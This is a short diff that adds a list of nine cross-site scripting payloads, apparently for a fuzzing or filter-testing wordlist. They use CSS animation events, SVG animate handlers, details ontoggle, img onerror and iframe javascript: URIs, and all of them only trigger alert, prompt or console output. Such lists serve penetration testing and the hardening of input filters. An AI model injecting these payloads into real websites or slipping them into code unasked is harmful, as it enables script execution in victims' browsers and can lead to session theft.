@@ -1,0 +1,9 @@
+<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert`1`"></xss>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=console.log(1) attributeName=x dur=1s>
+<details ontoggle=window.alert(1) open>test</details>
+<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
+<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
+<iframe  src="&Tab;javascript:prompt(1)&Tab;">
+<iframe  src="javascript:prompt(1)">
+<img src=`xx:xx`onerror=alert(1)>
